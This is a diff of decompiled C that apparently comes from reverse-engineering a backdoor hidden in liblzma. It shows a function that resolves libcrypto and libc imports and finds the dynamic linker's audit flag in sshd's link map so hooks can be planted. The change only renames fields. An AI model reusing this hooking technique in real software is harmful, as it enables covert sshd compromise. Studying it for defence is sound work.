@@ -50,7 +50,7 @@ BOOL find_link_map_l_audit_any_plt_bitmask
       zero_ctx_cursor = (dasm_ctx_t *)((long)zero_ctx_cursor + (ulong)zero_seed * -8 + 4);
     }
     allocator = get_lzma_allocator();
-    allocator->opaque = data->elf_handles->libcrypto;
+    allocator->opaque = data->cached_elf_handles->libcrypto;
     evp_decryptinit_stub = (pfn_EVP_DecryptInit_ex_t)lzma_alloc(0xc08,allocator);
     imports = search_ctx->imported_funcs;
     imports->EVP_DecryptInit_ex = evp_decryptinit_stub;
@@ -59,7 +59,7 @@ BOOL find_link_map_l_audit_any_plt_bitmask
     }
     libc_imports = imports->libc;
     libc_allocator = get_lzma_allocator();
-    libc_allocator->opaque = data->elf_handles->libc;
+    libc_allocator->opaque = data->cached_elf_handles->libc;
     getuid_stub = (pfn_getuid_t)lzma_alloc(0x348,libc_allocator);
     libc_imports->getuid = getuid_stub;
     if (getuid_stub != (pfn_getuid_t)0x0) {
@@ -196,7 +196,7 @@ LAB_00104da9:
           if ((insn_ctx.imm_zeroextended < 0x100) &&
              (mask_bits = count_bits(insn_ctx.imm_zeroextended), mask_bits == 1)) {
             hook_table = search_ctx->hooks;
-            audit_flag_slot = data->data->main_map + *(uint *)&search_ctx->offset_to_match;
+            audit_flag_slot = data->runtime_data->main_map + *(uint *)&search_ctx->offset_to_match;
             (hook_table->ldso_ctx).sshd_link_map_l_audit_any_plt_addr = audit_flag_slot;
             (hook_table->ldso_ctx).link_map_l_audit_any_plt_bitmask = (u8)insn_ctx.imm_zeroextended;
             if ((audit_flag_slot->_opaque & insn_ctx.imm_zeroextended) == 0) {
@@ -209,7 +209,7 @@ LAB_00104da9:
       }
 LAB_00104e97:
     }
-    allocator->opaque = data->elf_handles->libcrypto;
+    allocator->opaque = data->cached_elf_handles->libcrypto;
     lzma_free(search_ctx->imported_funcs->EVP_DecryptInit_ex,allocator);
     lzma_free(libc_imports->getuid,libc_allocator);
   }
